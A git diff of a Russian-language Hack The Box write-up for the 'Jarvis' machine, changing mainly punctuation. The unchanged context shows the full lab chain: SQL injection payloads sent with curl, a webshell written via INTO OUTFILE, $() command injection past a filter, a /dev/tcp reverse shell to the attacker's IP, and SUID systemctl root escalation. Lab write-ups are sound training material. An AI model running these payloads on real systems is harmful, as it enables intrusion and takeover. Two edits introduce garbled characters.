@@ -1,4 +1,4 @@
-# Jarvis (HTB)
+﻿# Jarvis (HTB)
 
 > Платформа: Hack The Box  
 > ОС: Linux  
@@ -33,7 +33,7 @@ Foothold (RCE via INTO OUTFILE)
 Lateral Movement (www-data → pepper)
 ├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ├── simpler.py: forbidden = ['&', ';', '-', '`', '||', '|']
-├── Обход через $() — command substitution не заблокирован
+├── Обход через $() - command substitution не заблокирован
 ├── /tmp/shell.sh: bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
 ├── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh)
 └── Shell от pepper → user.txt
@@ -50,7 +50,7 @@ Privilege Escalation (pepper → root)
 
 ## Machine Briefing
 
-Apache 2.4.25 (Debian) на порту 80 с сайтом "Stark Hotel" и дополнительный Apache на порту 64999 (с fail2ban). SQL-инъекция в `room.php?cod=` позволяет писать файлы через `INTO OUTFILE`, что даёт webshell. Далее — command injection в `simpler.py` для перехода на `pepper` и SUID `systemctl` для root.
+Apache 2.4.25 (Debian) на порту 80 с сайтом "Stark Hotel" и дополнительный Apache на порту 64999 (с fail2ban). SQL-инъекция в `room.php?cod=` позволяет писать файлы через `INTO OUTFILE`, что даёт webshell. Далее - command injection в `simpler.py` для перехода на `pepper` и SUID `systemctl` для root.
 
 ---
 
@@ -66,10 +66,10 @@ nmap -sC -sV -Pn -n --open -p 22,80,64999 jarvis.htb -oA scans/detail
 | Порт  | Сервис | Версия                              |
 |-------|--------|-------------------------------------|
 | 22    | SSH    | OpenSSH 7.4p1 Debian 10+deb9u6      |
-| 80    | HTTP   | Apache httpd 2.4.25 (Debian) — Stark Hotel |
-| 64999 | HTTP   | Apache httpd 2.4.25 (Debian) — fail2ban |
+| 80    | HTTP   | Apache httpd 2.4.25 (Debian) - Stark Hotel |
+| 64999 | HTTP   | Apache httpd 2.4.25 (Debian) - fail2ban |
 
-Порт 64999 защищён fail2ban — при частых запросах блокирует IP на 90 секунд. **Не трогаем его**, чтобы не потерять доступ.
+Порт 64999 защищён fail2ban - при частых запросах блокирует IP на 90 секунд. **Не трогаем его**, чтобы не потерять доступ.
 
 ### Directory Enumeration
 
@@ -100,7 +100,7 @@ curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=1" | wc -c
 # 6204
 
 curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=2" | wc -c
-# 5916 — разница → boolean-based SQLi
+# 5916 - разница → boolean-based SQLi
 ```
 
 **Ключевой момент:** используем `-G` + `--data-urlencode`, чтобы curl корректно кодировал пробелы (`%20`), `;` (`%3B`), `+` (`%2B`). Без этого payload обрезается.
@@ -167,14 +167,14 @@ curl -s -G "http://jarvis.htb/room.php" \
   --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('F:',File_priv,':E'),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -"
 ```
 
-**Результат:** `F:Y:E` — FILE privilege есть.
+**Результат:** `F:Y:E` - FILE privilege есть.
 
 ```bash
 curl -s -G "http://jarvis.htb/room.php" \
   --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('SEC:',@@secure_file_priv,':END'),3,4,5,6,7-- -"
 ```
 
-**Результат:** `SEC::END` — `secure_file_priv` пустой, можно писать куда угодно.
+**Результат:** `SEC::END` - `secure_file_priv` пустой, можно писать куда угодно.
 
 ---
 
@@ -199,7 +199,7 @@ curl "http://jarvis.htb/test.php"
 # HelloWorld    2    3    4    5    6    7
 ```
 
-`INTO OUTFILE` **не перезаписывает существующий файл**. Если нужно записать новый — используй другое имя.
+`INTO OUTFILE` **не перезаписывает существующий файл**. Если нужно записать новый - используй другое имя.
 
 ### Webshell
 
@@ -274,9 +274,9 @@ def exec_ping():
     os.system('ping ' + command)
 ```
 
-**Ключевое:** фильтр запрещает `&`, `;`, `-`, `` ` ``, `||`, `|`, но **не запрещает `$`, `(`, `)`**. �-начит, можно использовать `$()` — command substitution.
+**Ключевое:** фильтр запрещает `&`, `;`, `-`, `` ` ``, `||`, `|`, но **не запрещает `$`, `(`, `)`**. �-начит, можно использовать `$()` - command substitution.
 
-**Важный нюанс:** `os.system` вызывает `/bin/sh -c "..."` — на Debian это **dash**, а не bash. Dash **не понимает `>&`** — выдаёт `Bad fd number`. Поэтому внутри файла-скрипта нужна обёртка `bash -c "..."` (с **двойными** кавычками, чтобы dash передал содержимое bash без своей интерпретации).
+**Важный нюанс:** `os.system` вызывает `/bin/sh -c "..."` - на Debian это **dash**, а не bash. Dash **не понимает `>&`** - выдаёт `Bad fd number`. Поэтому внутри файла-скрипта нужна обёртка `bash -c "..."` (с **двойными** кавычками, чтобы dash передал содержимое bash без своей интерпретации).
 
 ### Подготовка скрипта
 
@@ -335,7 +335,7 @@ ls -la /bin/systemctl
 -rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
 ```
 
-SUID установлен, владелец `root`, группа `pepper` — значит `pepper` может запускать `systemctl` **с правами root**.
+SUID установлен, владелец `root`, группа `pepper` - значит `pepper` может запускать `systemctl` **с правами root**.
 
 ### Создание вредоносного unit
 
@@ -368,7 +368,7 @@ nc -lvnp 4445
 /bin/systemctl start root.service
 ```
 
-`systemctl link` — легальная команда, которая позволяет подключать unit-файл из любого места, а не только из `/etc/systemd/system/`. Через SUID `systemctl` мы подключаем наш unit и запускаем его от root.
+`systemctl link` - легальная команда, которая позволяет подключать unit-файл из любого места, а не только из `/etc/systemd/system/`. Через SUID `systemctl` мы подключаем наш unit и запускаем его от root.
 
 ### Root shell
 
@@ -389,7 +389,7 @@ cat /root/root.txt
 
 ## Flags
 
-| Флаг | �-начение                         |
+| Флаг | �-начение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | <ROOT_FLAG> |
@@ -398,8 +398,8 @@ cat /root/root.txt
 
 ## Key Takeaways
 
-- **Ручная SQLi без sqlmap** — boolean-based, ORDER BY, UNION SELECT. На экзамене OSCP sqlmap запрещён, всё делается руками.
-- **`INTO OUTFILE` не перезаписывает файл** — при повторной записи с тем же именем MariaDB вернёт ошибку. Используй новое имя.
-- **`os.system` в Python вызывает `sh` (dash), а не bash** — `>&` не работает; нужна обёртка `bash -c "..."` с двойными кавычками.
-- **Фильтры часто неполные** — `forbidden = ['&', ';', '-', '`', '||', '|']` пропускает `$()`, что открывает command injection.
-- **SUID `systemctl`** — классика GTFOBins. `link` позволяет подключать unit из любого места, `start` запускает его от root.
+- **Ручная SQLi без sqlmap** - boolean-based, ORDER BY, UNION SELECT. На экзамене OSCP sqlmap запрещён, всё делается руками.
+- **`INTO OUTFILE` не перезаписывает файл** - при повторной записи с тем же именем MariaDB вернёт ошибку. Используй новое имя.
+- **`os.system` в Python вызывает `sh` (dash), а не bash** - `>&` не работает; нужна обёртка `bash -c "..."` с двойными кавычками.
+- **Фильтры часто неполные** - `forbidden = ['&', ';', '-', '`', '||', '|']` пропускает `$()`, что открывает command injection.
+- **SUID `systemctl`** - классика GTFOBins. `link` позволяет подключать unit из любого места, `start` запускает его от root.
